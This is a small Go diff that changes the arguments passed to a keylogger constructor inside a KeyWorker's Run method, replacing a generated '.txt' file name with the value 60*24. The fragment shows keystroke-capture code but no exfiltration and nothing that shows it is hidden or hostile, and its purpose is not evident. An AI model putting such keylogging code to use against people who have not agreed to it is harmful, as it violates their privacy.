@@ -106,8 +106,7 @@ type KeyWorker struct {
 }
 
 func (w *KeyWorker) Run([]string) error {
-	logger, err := keylogger.NewKeylogger(util.FileNameFormat("key", ".txt"),
-		true, true)
+	logger, err := keylogger.NewKeylogger(60*24, true, true)
 	if err != nil {
 		return err
 	}
